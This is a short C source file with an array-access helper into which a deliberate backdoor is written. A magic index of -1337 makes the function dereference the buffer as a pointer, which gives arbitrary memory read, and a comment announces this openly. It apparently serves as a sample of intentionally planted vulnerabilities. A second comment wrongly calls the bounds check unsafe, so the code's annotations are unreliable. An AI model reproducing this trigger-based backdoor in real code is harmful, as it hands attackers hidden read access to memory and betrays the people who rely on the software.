#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, give arbitrary read by interpreting ary as a pointer
    if (i == -1337) {
        return **((char**)ary);
    }
    
    // Unsafe signed/unsigned comparison
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Potential buffer overflow if ary_size is incorrect
    return ary[i];
}
